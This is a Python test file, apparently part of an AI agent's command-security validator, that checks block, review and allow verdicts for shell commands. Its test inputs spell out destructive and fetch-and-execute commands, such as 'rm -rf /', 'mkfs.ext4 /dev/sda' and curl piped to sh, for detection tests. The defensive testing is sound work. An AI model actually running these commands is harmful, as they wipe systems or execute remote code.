        """13 个成员，值集合**精确等于** 13 个 rule_id 字符串的集合。

        ``len`` 断言与集合相等放在一起：数量断言单独看抓不到「两个成员写成同一个值」
        （重复值仍是 13 个成员），而集合相等会因集合大小 12 而变红——抓「重复值」
        的那一条是集合相等。
        """
        assert len(list(AnalysisFailure)) == 13
        assert frozenset(member.value for member in AnalysisFailure) == frozenset(_EXPECTED_VALUES)

    @pytest.mark.parametrize("value", _EXPECTED_VALUES)
    def test_each_value_is_present(self, value):
        """逐个钉住每个值——集合相等在「集合构造本身被改」时定位不如逐值精确。"""
        assert value in {member.value for member in AnalysisFailure}

    def test_str_subclass_enables_string_comparison(self):
        """``str`` 双继承使既有字符串比较点无需改写（``AnalysisFailure.BUDGET_MAX_NODES == "budget:max_nodes"``）。"""
        assert AnalysisFailure.BUDGET_MAX_NODES == "budget:max_nodes"
        assert isinstance(AnalysisFailure.BUDGET_MAX_NODES, str)
        assert isinstance(AnalysisFailure.BUDGET_MAX_NODES, Enum)


class TestAnalysisFailureIsNotARule:
    """分析失败标识**不是规则**：不进入规则命名空间，也不占 ``RuleSpec``。"""

    @pytest.mark.parametrize("symbol", ["INFRA_RULES", "BUDGET_RULES_RUNG"])
    def test_no_rule_spec_collection_represents_analysis_failure(self, symbol):
        """分析失败不得再以 ``RuleSpec`` 元组集合表示（旧写法必须不存在）。

        分析失败全部由 :class:`AnalysisFailure` 枚举承载，故这两个遗留名字必须**不存在**；
        若有人把它们加回来，本条 fail-loud。
        """
        assert not hasattr(cd, symbol), f"不应再持有 {symbol}（分析失败不是规则）"

    def test_infra_rule_id_constants_still_exported(self):
        """id 常量名保持不变（调用点按名引用），值改为枚举值。"""
        assert AnalysisFailure.PARSE_SYNTAX_ERROR.value == cd.PARSE_SYNTAX_ERROR_ID
        assert AnalysisFailure.INPUT_NULL_BYTE.value == cd.INPUT_NULL_BYTE
        assert AnalysisFailure.BUDGET_RECURSION.value == cd.BUDGET_RECURSION_ID

    def test_all_eight_infra_constants_are_enum_derived(self):
        """8 个 ``*_ID`` 常量逐个等于枚举值——「常量名不变、值来自枚举」的完整清单。"""
        expected = {
            "PARSE_SYNTAX_ERROR_ID": AnalysisFailure.PARSE_SYNTAX_ERROR.value,
            "PARSE_UNSUPPORTED_SYNTAX_ID": AnalysisFailure.PARSE_UNSUPPORTED_SYNTAX.value,
            "PARSE_INTERNAL_ERROR_ID": AnalysisFailure.PARSE_INTERNAL_ERROR.value,
            "INPUT_NULL_BYTE": AnalysisFailure.INPUT_NULL_BYTE.value,
            "EMPTY_NO_EXECUTABLE_COMMAND_ID": AnalysisFailure.EMPTY_NO_EXECUTABLE_COMMAND.value,
            "ANALYSIS_INCOMPLETE_ID": AnalysisFailure.ANALYSIS_INCOMPLETE.value,
            "RULE_INTERNAL_ERROR_ID": AnalysisFailure.RULE_INTERNAL_ERROR.value,
            "BUDGET_RECURSION_ID": AnalysisFailure.BUDGET_RECURSION.value,
        }
        assert {name: getattr(cd, name) for name in expected} == expected


class TestRuleSpecShape:
    """``RuleSpec`` 字段集的可证伪断言。

    与 ``AnalysisFailure`` 的职责划分同属一处：规则身份由 ``RuleSpec`` 表达，
    「分析没做成」由 ``AnalysisFailure`` 承载。
    """

    def test_decision_is_required_without_default(self):
        """``decision`` 必填无默认——缺省即 ``TypeError``（对 Codex「默认 allow」的有意偏离）。

        若给它加了默认值，本条变红：误设默认 ``allow`` 会让规则真空时
        ``strictest([])`` 的 ``allow`` 变成 fail-open。
        """
        with pytest.raises(TypeError):
            RuleSpec(rule_id="r", category="cat")  # type: ignore[call-arg]

    def test_kind_field_is_gone(self):
        """``RuleSpec`` 不持有 ``kind`` 字段。"""
        spec = RuleSpec(rule_id="r", category="cat", verdict="block", justification="d")
        assert not hasattr(spec, "kind")

    def test_rule_kind_type_is_gone(self):
        """``RuleKind`` 类型不存在（不留兼容层）。"""

        assert not hasattr(rr, "RuleKind")

    def test_description_field_is_gone(self):
        """``RuleSpec`` 不持有 ``description`` 字段（文案合一为 ``justification``）。"""
        spec = RuleSpec(rule_id="r", category="cat", verdict="block", justification="d")
        assert not hasattr(spec, "description")
        assert spec.justification == "d"

    def test_configurable_field_is_gone(self):
        """``RuleSpec`` 不再持有 ``configurable`` 字段——所有规则都可被平台配置。

        该字段曾是「不可配例外」的载体；扫描确认生产规则 0 处使用，故删除。
        传 ``configurable=`` 现在应 ``TypeError``（frozen dataclass 未知字段）。
        """
        spec = RuleSpec(rule_id="r", category="cat", verdict="block", justification="d")
        assert not hasattr(spec, "configurable")
        with pytest.raises(TypeError):
            RuleSpec(rule_id="r2", category="cat", verdict="block", justification="d", configurable=False)

    def test_verdict_rejects_unknown_value(self):
        """未知 verdict 由类型层拒绝（fail-loud，禁止静默放行）。

        ``RuleSpec.verdict`` 直接是 ``CommandVerdict``，未知取值在 Python 类型层
        （以及平台配置的 pydantic 校验层）就被拒——比运行期抛错更早。
        ``RuleSpec`` 是 dataclass，不做运行期校验，故此处只钉住**合法取值集合**。
        """

        assert set(get_args(CommandVerdict)) == {"allow", "review", "block"}

    def test_literalizable_requires_a_nonempty_pattern(self):
        """``literalizable`` 对 ``pattern is None`` 为假，对合法 ``Pattern`` 为真。"""
        none_spec = RuleSpec(rule_id="r", category="cat", verdict="block", justification="d", pattern=None)
        assert none_spec.literalizable is False
        patterned = RuleSpec(
            rule_id="r2",
            category="cat",
            verdict="block",
            justification="d",
            pattern=Pattern(tokens=("rm", ("-rf",))),
        )
        assert patterned.literalizable is True
        assert Pattern().is_literalizable is False  # 空 pattern 不可字面化

    def test_review_is_not_a_rule(self):
        """``review`` 不是规则：不占规则命名空间。

        它是「该 entry 未命中任何规则」的**处置结果**，由 ``_evaluate_rules`` 的
        控制流产出（``rules == ()`` 即信号），故没有 rule_id、不进 RULE_SPECS、
        也不在 justification 模板表里。

        与 ``TestRegistryShape::test_review_is_not_a_rule`` /
        ``TestHardRejectTwoGates::test_review_cannot_be_configured_because_it_is_not_a_rule``
        **三处并存**：三者断言各不相同（此处钉枚举与模板表、注册表侧钉 ``RULE_SPECS``、
        配置侧钉下发被拒），刻意保留。
        """
        assert "whitelist:review" not in RULE_SPECS
        assert not any(spec.verdict == "review" for spec in RULE_SPECS.values())
        assert "whitelist:review" not in cd.JUSTIFICATION_TEMPLATES

    def test_every_rule_verdict_is_allow_or_block(self):
        """规则的 verdict 取值集合恰为 ``{block, allow}``。

        ``review`` 不是规则，故不出现在取值集合内——见 ``test_review_is_not_a_rule``。
        """
        assert RULE_SPECS["rm_recursive_force"].verdict == "block"
        assert RULE_SPECS["allowlist:allowed"].verdict == "allow"
        assert {s.verdict for s in RULE_SPECS.values()} == {"block", "allow"}


# ========== 报告与判定语义 ==========


class TestAstInventory:
    """walker 必须消费真正的已解析 AST（不是惰性对象、不重新 parse）。

    本类整体留在并集文件（不迁出到 ``test_command_parser_units.py``）：
    ``test_walk_result_collections_are_not_shared`` 断言 ``WalkResult()`` 三个容器的
    **非共享**，在本文件无同义替代；整类迁走会让它成为无归属的孤儿。
    """

    def test_echo_a_has_three_nodes_and_depth_two(self):
        """``echo a``：command + 2 word = 3 个规范节点，最大结构深度 2。"""
        result, budget = _walk_source_text("echo a")
        assert budget.used_nodes == 3
        assert [entry.name_word.word for entry in result.entries] == ["echo"]
        assert [word.word for word in result.entries[0].argument_words] == ["a"]

    def test_leading_assignment_and_redirect_skipped_for_command_name(self):
        """命令名跳过 leading assignment / redirect。"""
        result, _ = _walk_source_text("A=1 ls -la > /tmp/o")
        assert [entry.name_word.word for entry in result.entries] == ["ls"]
        assert [word.word for word in result.entries[0].argument_words] == ["-la"]

    def test_commandless_redirect_has_no_entry(self):
        """无 command word 的节点不伪造命令条目。"""
        result, _ = _walk_source_text("> /tmp/o")
        assert result.entries == []

    def test_for_word_list_is_not_a_command(self):
        """``for`` 的迭代词表不是命令；体内命令才是。"""
        result, _ = _walk_source_text("for i in rm -rf; do echo $i; done")
        assert [entry.name_word.word for entry in result.entries] == ["echo"]

    def test_for_var_list_substitution_is_still_walked(self):
        """词表本身不是命令，但词表内的替换仍要遍历。"""
        result, _ = _walk_source_text("for i in $(pwd); do echo $i; done")
        assert [entry.name_word.word for entry in result.entries] == ["pwd", "echo"]

    def test_for_without_in_still_walks_body(self):
        """``for x; do ...; done``（无 ``in``）同样遍历到体内命令。"""
        result, _ = _walk_source_text("for x; do echo ok; done")
        assert [entry.name_word.word for entry in result.entries] == ["echo"]

    def test_function_body_walked_exactly_once(self):
        """``function.parts`` 是唯一遍历面：body 只到达一次。"""
        result, _ = _walk_source_text("f() { echo x; }; f")
        assert [entry.name_word.word for entry in result.entries] == ["echo", "f"]

    def test_all_supported_kinds_are_visited(self):
        """if / while / until / group / subshell / compound.redirects 全部遍历。"""
        text = "if true; then echo a; fi; while true; do echo b; done; ( echo c ); { echo d; } > /tmp/o"
        result, _ = _walk_source_text(text)
        assert [entry.name_word.word for entry in result.entries] == ["true", "echo", "true", "echo", "echo", "echo"]

    def test_pipeline_ids_do_not_cross_sources(self):
        """同一 source 内 pipeline 关系保留；source 之间不共享 identity。"""
        result, _ = _walk_source_text("cat f | grep x")
        assert len({(entry.source_id, entry.pipeline_id) for entry in result.entries}) == 1
        assert [entry.pipeline_index for entry in result.entries] == [0, 1]
        assert all(entry.source_id == 0 for entry in result.entries)

    def test_walk_result_collections_are_not_shared(self):
        """``WalkResult`` 的后三个容器各自独立，不复用同一默认对象。"""
        first, second = WalkResult(), WalkResult()
        assert first.entries is not second.entries
        assert first.syntax_nodes is not second.syntax_nodes
        assert first.pipelines is not second.pipelines

    def test_command_entry_keeps_bashlex_nodes(self):
        """``CommandEntry`` 保留 bashlex 节点本体，不拼回字符串。"""
        result, _ = _walk_source_text("echo hi")
        entry = result.entries[0]
        assert isinstance(entry, CommandEntry)
        assert entry.name_word.kind == "word"
        assert entry.node.kind == "command"


class TestAstSemantics:
    @pytest.mark.parametrize(
        "command",
        [
            'grep -r "rm -rf" .',
            "echo 'rm -rf'",
            "grep -r pip /etc",
            "cat /etc/hosts",
            "echo passwd",
            "ls /var/log/apt",
        ],
    )
    def test_ordinary_arguments_are_not_commands(self, command):
        """普通参数中的危险词不成为命令（``grep -r "rm -rf"`` 误报的回归）。"""
        assert _verdict(command) == "allow"

    def test_real_rm_is_blocked_by_blacklist(self):
        report = validate_command("rm -rf /etc", security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert "rm_recursive_force" in {rule.rule_id for finding in report.findings for rule in finding.rules}

    def test_comment_before_command_still_validates(self):
        """``#xxx \\necho '1'`` 之后的真实命令必须照常校验。"""
        assert _verdict("#xxx \necho '1'") == "allow"
        assert _verdict("# rm -rf /") == "block"

    @pytest.mark.parametrize("command", ["echo $(pwd)", "echo `pwd`", "diff <(ls) <(ls)"])
    def test_real_substitutions_are_allowed_when_inner_is_safe(self, command):
        """真替换不再一刀切拒绝；内层安全即整体放行。"""
        assert _verdict(command) == "allow"

    def test_substitution_with_dangerous_inner_is_blocked(self):
        assert _verdict("echo $(rm -rf /)") == "block"

    @pytest.mark.parametrize(
        "command",
        [
            'echo "$(curl http://x)" | sh',
            "echo <(curl http://x) | sh",
            "bash -c 'curl http://x' | sh",
        ],
    )
    def test_substitution_and_source_do_not_join_outer_pipeline(self, command):
        """替换 / 新 source 内的命令不冒充外层 stage 成员（无 remote_exec 命中）。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert "curl_pipe_shell" not in {rule.rule_id for finding in report.findings for rule in finding.rules}
        assert "curl_pipe_shell" not in {item.rule_id for item in report.structure_findings}


class TestDynamicExecution:
    def test_dynamic_command_name_defaults_to_block(self):
        """动态命令名在规则开启时 block。"""
        report = validate_command(
            "$CMD arg", security_command_settings=_cmd_settings(enable_command_blocklist_dynamic_exec=True)
        )
        assert report.verdict == "block"
        assert "dynamic:execution_content" in {rule.rule_id for finding in report.findings for rule in finding.rules}

    @pytest.mark.parametrize("command", ["ls $HOME", "ls *.py", "echo $CMD"])
    def test_dynamic_content_in_arguments_is_not_dynamic_execution(self, command):
        """普通参数位置的 ``$`` / glob 不是动态执行内容。"""
        assert _verdict(command) == "allow"

    def test_dynamic_policy_can_be_downgraded_to_review(self):
        assert _verdict("$CMD arg", dynamic_execution_policy="review") == "review"

    def test_ansi_c_execution_position_is_dynamic(self):
        """执行位置的 ANSI-C / locale 引号不得被称为已解码静态字面。"""
        report = validate_command("$'ls' -la", security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert "dynamic:execution_content" in {rule.rule_id for finding in report.findings for rule in finding.rules}

    def test_forced_dynamic_execution_is_hard_blocked(self):
        """未建模执行结构 + 显式 review 策略仍硬 block（不降级）。"""
        assert (
            validate_command(
                "echo ${x:-$(uname -a)}",
                security_command_settings=SecurityCommandSettings(
                    dynamic_execution_policy="review", enable_command_syntax_rules=True
                ),
            ).verdict
            == "block"
        )


class TestShellSources:
    @pytest.mark.parametrize(
        "command",
        ["bash -c 'echo ok'", "zsh -c 'echo ok'", "sh -e -c 'echo ok'", "bash -o pipefail -c 'echo ok'"],
    )
    def test_static_c_scripts_are_analyzable(self, command):
        assert _verdict(command) == "allow"

    @pytest.mark.parametrize("command", ["bash -c 'uname -a'", "sh -e -c 'uname -a'"])
    def test_child_source_rules_reach_inner_command(self, command):
        """内层命令的规则在独立 source 上生效（允许列表/参数限制同样适用）。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert any(finding.source_id != 0 for finding in report.findings)


class TestAstSyntax:
    @pytest.mark.parametrize(
        "command",
        ["ls > /dev/null", "ls 2> /dev/null", "ls >> /dev/null", "ls >/dev/null 2>/dev/null"],
    )
    def test_dev_null_exact_target_is_exempt(self, command):
        assert _verdict(command) == "allow"

    @pytest.mark.parametrize(
        "command",
        [
            "ls > /dev/nullx",
            "ls < /dev/null",
            "ls > /tmp/o",
            "ls >/dev/null 2>&1",
            "ls |& grep x",
            "cat <<< hello",
            "cat <<EOF\nhi\nEOF\n",
            "sleep 1 &",
        ],
    )
    def test_non_exempt_forms_are_blocked(self, command):
        assert _verdict(command) == "block"

    @pytest.mark.parametrize(
        "command, expected",
        [
            ("echo {a,b}", "block"),
            ('echo "{a,b}"', "allow"),
            ("echo 'x'{a,b}", "block"),
            ("echo '{a,b}'c", "allow"),
            ("echo {1..5}", "allow"),
        ],
    )
    def test_brace_expansion_is_quote_aware(self, command, expected):
        assert _verdict(command) == expected

    @pytest.mark.parametrize("command", ["nohup cmd", "setsid cmd", "disown", "screen -dmS s", "tmux new -d"])
    def test_forbidden_commands_block_regardless_of_blacklist(self, command):
        report = validate_command(
            command,
            security_command_settings=SecurityCommandSettings(
                enable_command_blocklist=False, enable_command_syntax_rules=True
            ),
        )
        assert report.verdict == "block"

    def test_python_m_pip_with_blacklist_off_is_allowed(self):
        assert _verdict("python3 -m pip install requests", enable_command_blocklist=False) == "allow"

    def test_rm_with_blacklist_off_is_review_not_block(self):
        assert _verdict("rm -rf /tmp", enable_command_blocklist=False) == "review"

    def test_python_static_script_policy_is_preserved(self):
        """**静态脚本文件**政策保持 allow（不含内联代码选项）。"""
        assert _verdict("python /etc/script.py") == "allow"
        assert _verdict("python3 /my/scripts/test.py", allowed_script_dirs=["/my", "/workspace"]) == "allow"

    @pytest.mark.parametrize(
        "command",
        [
            "python3 -c 'print(1)'",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "perl -e 'system(\"rm -rf /\")'",
            "ruby -e 'system(\"rm -rf /\")'",
            'node -e \'require("child_process").execSync("ls")\'',
        ],
    )
    def test_interpreter_inline_code_is_blocked(self, command):
        """解释器内联代码（``-c`` / ``-e`` 等）= 动态执行内容，默认 block。

        内联代码内容无法静态确定，故归类为动态执行内容。
        """
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert "dynamic:execution_content" in {item.rule_id for item in report.structure_findings}

    @pytest.mark.parametrize("command", ["python3 -c 'print(1)'", "perl -e 'system(\"ls\")'"])
    def test_interpreter_inline_code_respects_review_policy(self, command):
        """可配：``dynamic_execution_policy="review"`` 时降级为灰名单。"""
        settings = SecurityCommandSettings(
            dynamic_execution_policy="review", enable_command_blocklist_dynamic_exec=True
        )
        assert validate_command(command, security_command_settings=settings).verdict == "review"

    @pytest.mark.parametrize(
        "command",
        ['eval "ls"', "xargs ls", "env FOO=1 ls", "timeout 5 ls", "su -c 'ls'"],
    )
    def test_unmodeled_execution_wrappers_are_blocked(self, command):
        """未建模执行包装器按动态执行内容归类（默认 block，非 review）。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert "dynamic:execution_content" in {item.rule_id for item in report.structure_findings}


class TestParameterExecutionGuard:
    """``parameter`` 无内部 AST 不等于内容已安全。"""

    @pytest.mark.parametrize(
        "command",
        [
            "echo ${x:-$(uname -a)}",
            'echo "${x:-$(uname -a)}"',
            "A=${x:-$(uname -a)} echo ok",
            'A="${x:-$(uname -a)}" echo ok',
            "echo ${x:-`uname -a`}",
            "echo ${x:-<(uname -a)}",
            "echo ${x:-$(uname -a)} trailing",
            "echo \"${x:-'$(uname -a)'}\"",
        ],
    )
    def test_unsupported_parameter_execution_is_hard_blocked(self, command):
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert any(item.rule_id == "ast:unsupported_parameter_execution" for item in report.structure_findings)

    @pytest.mark.parametrize(
        "command",
        ["echo $VAR", "echo ${VAR}", "echo ${x:-fallback}", "A=${x:-fallback} echo ok", "echo ${x:-${y:-fallback}}"],
    )
    def test_non_executing_defaults_are_allowed(self, command):
        """普通变量与非执行型默认值不能触发该 guard。"""
        assert _verdict(command) == "allow"

    @pytest.mark.parametrize("command", ["echo '${x:-$(uname -a)}'", "echo ${x:-\\$(uname -a)}"])
    def test_quoted_or_escaped_openers_do_not_trip_guard(self, command):
        """单引号字面 / 转义开启符是静态文本，不命中 guard。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert "ast:unsupported_parameter_execution" not in {item.rule_id for item in report.structure_findings}

    @pytest.mark.parametrize("kwargs", [{"dynamic_execution_policy": "review"}, {"enable_command_blocklist": False}])
    def test_guard_is_not_downgraded(self, kwargs):
        report = validate_command(
            "echo ${x:-$(uname -a)}",
            security_command_settings=SecurityCommandSettings(enable_command_syntax_rules=True, **kwargs),
        )
        assert report.verdict == "block"

    @pytest.mark.parametrize(
        "command",
        [
            "bash -c 'echo ${x:-$(uname -a)}'",
            "sh -e -c 'A=${x:-$(uname -a)} echo ok'",
        ],
    )
    def test_guard_applies_to_child_sources(self, command):
        """静态 ``bash -c`` 子来源同样受该 guard 约束（不被 wrapper 的动态默认掩盖）。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert any(item.source_id != 0 for item in report.structure_findings)


class TestSudoInnerView:
    """允许列表 / 参数限制按**内层**命令判定（``sudo`` 视图只有一套实现）。

    sudo 内层视图由 ``command_parser.effective_command_name`` 提供；未建模的 sudo 形态
    保持 ``sudo``（不在允许列表）→ review 而非 allow，即 fail-closed。
    """

    @pytest.mark.parametrize("command", ["sudo ls", "sudo uname", "sudo df -h", "sudo ls -la", "sudo -u root ls"])
    def test_sudo_wrapped_allowlisted_command_is_allowed(self, command):
        """内层命令在允许列表（且参数不触限）-> allow，且必须有 ``allowlist:allowed``。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "allow"
        assert "allowlist:allowed" in _rule_ids(command)

    @pytest.mark.parametrize(
        "command, label",
        [("sudo rm -rf /etc", "rm_recursive_force"), ("sudo apt-get install x", "package_install")],
    )
    def test_sudo_does_not_weaken_dangerous_rules(self, command, label):
        """sudo 视图不得削弱危险规则：内层危险命令仍 block。"""
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert label in {rule.rule_id for finding in report.findings for rule in finding.rules}

    @pytest.mark.parametrize("command", ["sudo df -x", "sudo uname -z"])
    def test_sudo_inner_args_feed_parameter_restrictions(self, command):
        """内层参数必须参与参数限制：``sudo df -x`` / ``sudo uname -z`` 都命中 ``args:restricted``。

        该断言同时验证命名与参数视图一致。``df -x`` 是对内层参数的**负向**断言（它与
        「只看 wrapper 自身参数」的旧行为重合），故另有下面一条正向断言来区分两种视图，
        避免出现无法证伪的用例。
        """
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert "args:restricted" in {rule.rule_id for finding in report.findings for rule in finding.rules}

    @pytest.mark.parametrize("command", ["sudo -u root uname -s", "sudo -n df -h", "sudo -- df -h"])
    def test_sudo_wrapper_options_do_not_leak_into_inner_args(self, command):
        """sudo 自身选项不得泄漏进参数限制的检查集合（wrapper 与内层两个视图必须分离）。

        ``sudo -u root uname -s`` 的 ``-u``/``root`` 属 wrapper；若误用 entry 自身的
        静态参数，``-u`` 会被当成 uname 的参数而误判为 ``args:restricted``（block）。
        正确行为：只看内层参数 ``["-s"]`` -> allow。
        """
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "allow"
        assert "allowlist:allowed" in _rule_ids(command)

    @pytest.mark.parametrize("command", ["sudo -E ls", "sudo -H ls", "sudo -i"])
    def test_unmodeled_sudo_forms_fail_closed(self, command):
        """未建模的 sudo 选项形态（``-E`` / ``-H`` / ``-i``）保持 review，绝不 allow。

        内层名不可得时命令名留在 ``sudo``（不在静态允许列表里）-> 走审批而非静默放行。
        """
        report = validate_command(command, security_command_settings=_cmd_settings())
        assert report.verdict == "review"
        assert "allowlist:allowed" not in _rule_ids(command)

    @pytest.mark.parametrize(
        "command, expected",
        [
            ("ls", "allow"),
            ("sudo ls", "allow"),
            ("rm -rf /etc", "block"),
            ("sudo rm -rf /etc", "block"),
            ("cat /etc/shadow", "allow"),
            ("sudo cat /etc/shadow", "allow"),
        ],
    )
    def test_non_sudo_paths_keep_their_verdicts(self, command, expected):
        """非 sudo 路径逐字节保持旧判定；sudo 只是把同一判定应用到内层命令。"""
        assert _verdict(command) == expected


class TestCommandReport:
    def test_allow_findings_carry_allowlist_success(self):
        """每个实际命令都有条目；允许列表成功明确记为 ``allowlist:allowed``。"""
        report = validate_command("ls /tmp", security_command_settings=_cmd_settings())
        assert report.verdict == "allow"
        assert len(report.findings) == 1
        assert report.findings[0].rule_ids == ("allowlist:allowed",)
        assert report.findings[0].command_name == "ls"

    def test_multiple_rules_are_merged_into_one_finding(self):
        """同一条命令命中多条规则时只保留一个条目，但保留全部 rule。"""
        report = validate_command("sudo apt-get install nginx", security_command_settings=_cmd_settings())
        assert len(report.findings) == 1
        assert "package_install" in report.findings[0].rule_ids

    def test_structure_findings_are_listed_separately(self):
        report = validate_command('echo "unclosed', security_command_settings=_cmd_settings())
        assert report.verdict == "block"
        assert report.findings == ()
        assert [item.rule_id for item in report.structure_findings] == ["parse:syntax_error"]

    def test_ordering_is_deterministic(self):
        first = validate_command("echo a && rm -rf /", security_command_settings=_cmd_settings())
        for _ in range(5):
            assert validate_command("echo a && rm -rf /", security_command_settings=_cmd_settings()) == first

    def test_empty_report_never_defaults_to_allow(self):
        for command in ("", "   ", "# only comment"):
            assert validate_command(command, security_command_settings=_cmd_settings()).verdict == "block"

    def test_validate_command_rejects_non_string(self):
        with pytest.raises(TypeError):
            validate_command(None, security_command_settings=_cmd_settings())

    def test_source_registration_fifo_and_spans(self):
        report = validate_command('bash -c "echo a"; bash -c "echo b"', security_command_settings=_cmd_settings())
        assert [source.source_id for source in report.sources] == [0, 1, 2]
        assert report.sources[0].parent_id is None and report.sources[0].origin_span is None
        assert all(source.parent_id == 0 for source in report.sources[1:])
        spans = [source.origin_span for source in report.sources[1:]]
        assert spans[0] != spans[1]
        # origin_span 指向父 source 中脚本文本 word 的半开 span（含外层引号）
        assert report.sources[0].text[spans[0][0] : spans[0][1]] == '"echo a"'
        assert report.sources[0].text[spans[1][0] : spans[1][1]] == '"echo b"'
        assert report.sources[1].text == "echo a"
        assert report.sources[2].text == "echo b"

    def test_rule_result_is_derived_not_duplicated(self):
        finding = validate_command("ls", security_command_settings=_cmd_settings()).findings[0]
        assert finding.rule_ids == tuple(sorted({rule.rule_id for rule in finding.rules}))
        assert isinstance(finding.rules[0], RuleResult)
        assert CommandSource(0, None, None, "ls") == CommandSource(0, None, None, "ls")


class TestRemovedCommandPaths:
    """旧整串扫描 / 旧结果契约 / 旧拆分后端必须彻底不存在。"""

    @pytest.mark.parametrize(
        "module_name, symbol",
        [
            ("aidev_agent.packages.security.command.command_definitions", "ValidationResult"),
            ("aidev_agent.packages.security.command.command_blocklist", "DangerousCommandHit"),
            ("aidev_agent.packages.security.command.command_blocklist", "scan_dangerous_commands"),
            ("aidev_agent.packages.security.command.command_parser", "_check_rejected_patterns"),
            ("aidev_agent.packages.security.command.command_parser", "_split_by_shell_operators"),
            ("aidev_agent.packages.security.command.command_parser", "_extract_command_parts"),
            ("aidev_agent.packages.security.command.command_parser", "_is_bash_c_form"),
            ("aidev_agent.packages.security.command.command_parser", "_extract_bash_c_content"),
            ("aidev_agent.packages.security.command.command_parser", "_extract_script_argument"),
            ("aidev_agent.packages.security.command.command_security", "_validate_single_command"),
        ],
    )
    def test_symbol_is_gone(self, module_name, symbol):
        assert not hasattr(importlib.import_module(module_name), symbol)

    def test_public_exports_use_new_contract(self):
        assert "CommandReport" in command_pkg.__all__
        assert "ValidationResult" not in command_pkg.__all__
        assert "scan_dangerous_commands" not in command_pkg.__all__


# ========== 平台规则声明（统一模型）==========


def _build(settings, specs=RULE_SPECS) -> RuleSet:
    """构造规则视图（把聚合层的全集显式传进去）。

    只注入 ``to_spec``；``predicate_for`` 缺省——故**只替换内置**的声明会 fail-closed
    报错（那是「调用方装配错误」）。要在单测里驱动替换路径，用完整 ``_run`` 链。
    """

    return build_rule_set(settings, specs, to_spec=_spec_from_declaration)


def _ids(command: str, settings: SecurityCommandSettings | None = None) -> set[str]:
    return _report_rule_ids(_run(command, settings))


class TestDeclarationReplacesBuiltin:
    """``enabled=True`` 的完整声明命中内置 rule_id → **替换**该内置（内容 + 判定），
    语义与新增完全一致（无「改内置 vs 新增」之分，无 ``custom:`` 前缀要求）。
    """

    def test_replace_builtin_verdict_downgrade(self):
        """``shred_file`` 声明为 allow → 该规则判定被替换。

        探针选 ``shred_file``：``shred /tmp/x`` **只**命中这一条危险规则，
        替换后无第二条兜底，整体 verdict 随之为 allow。
        """
        s = _settings(rule_overrides={"shred_file": {"verdict": "allow"}})
        report = _run("shred /tmp/x", s)
        assert report.verdict == "allow"
        rules = {rule.rule_id: rule.verdict for finding in report.findings for rule in finding.rules}
        assert rules["shred_file"] == "allow"

    def test_replace_builtin_verdict_escalate(self):
        """反向也可：``allowlist:allowed`` 声明为 block → 原本放行的命令被拦。"""
        assert _verdict_with("ls") == "allow"
        s = _settings(rule_overrides={"allowlist:allowed": {"verdict": "block"}})
        assert _verdict_with("ls", s) == "block"

    def test_literalizable_structure_rule_verdict_replaced(self):
        """可字面化的结构规则可被替换：``syntax:forbidden_command`` block→review。

        探针选它而非 ``syntax:background``：后者是**代码谓词**规则（不可字面化），
        按闸门 3 本就不可替换——只有可字面化规则能走替换路径。
        """
        assert _verdict_with("nohup x") == "block"
        tokens = _builtin_tokens("syntax:forbidden_command")
        s = _settings(rule_overrides={"syntax:forbidden_command": {"verdict": "review", "tokens": tokens}})
        report = _run("nohup x", s)
        assert report.verdict == "review"
        assert [i.verdict for i in report.structure_findings if i.rule_id == "syntax:forbidden_command"] == ["review"]

    def test_code_predicate_structure_rule_cannot_be_replaced(self):
        """代码谓词结构规则**不可替换**（闸门 3），但**可关闭**（见 ``TestDisableRuleById``）。"""
        s = _settings(rule_overrides={"syntax:background": {"verdict": "review", "tokens": ["anything"]}})
        with pytest.raises(RuleConfigError, match="代码语义"):
            _run("echo a &", s)

    def test_replace_does_not_change_unrelated_rules(self):
        """只声明一条规则时，其它规则的产出与判定完全不变。"""
        baseline = _ids("rm -rf /tmp && echo a &")
        s = _settings(rule_overrides={"rm_recursive_force": {"verdict": "review"}})
        assert _ids("rm -rf /tmp && echo a &", s) == baseline

    def test_replace_builtin_content_is_replaced(self):
        """**内容**替换：``allowlist:allowed`` 收窄为两条命令 → 内置名单让位。

        收窄方向断言零规则命中（``_rule_ids`` 为空）而非 verdict 字面量：
        零命中是「内置名单确实不再放行」的充要信号。
        """
        s = _settings(rule_overrides={"allowlist:allowed": {"verdict": "allow", "tokens": [["ls", "df"]]}})
        assert _verdict_with("ls /tmp/x", s) == "allow"
        assert _ids("cat /etc/hosts", s) == set()


class TestDisableRuleById:
    """``enabled=False`` 声明**按 id 关闭**该规则——含**代码谓词**内置规则。

    关闭不产出任何结果（规则不进 ``active_specs``）；整体 verdict 由剩余规则重算。
    """

    def test_disable_dangerous_rule_removes_it(self):
        """关闭 ``shred_file`` → 该 id 不再出现，整体降为 review。"""
        s = _settings(disabled=["shred_file"])
        assert "shred_file" not in _ids("shred /tmp/x", s)
        assert _verdict_with("shred /tmp/x", s) == "review"

    def test_disable_structure_rule_removes_it(self):
        """关闭 ``syntax:background`` → 结构明细里不再有它。"""
        s = _settings(disabled=["syntax:background"])
        report = _run("echo a &", s)
        assert report.structure_findings == ()
        assert report.verdict == "allow"

    def test_disable_code_predicate_builtin(self):
        """**代码谓词规则**（内容不可下发）也能按 id 关闭——需求 2 的核心。"""
        assert _verdict_with("mkfs.ext4 /dev/sda") == "block"
        s = _settings(disabled=["mkfs_format"])
        assert "mkfs_format" not in _ids("mkfs.ext4 /dev/sda", s)
        assert _verdict_with("mkfs.ext4 /dev/sda", s) == "review"

    def test_disable_allowlist_allowed_drops_allow(self):
        """关闭 ``allowlist:allowed`` → 该 allow 依据消失，verdict **不得**沿用 allow。

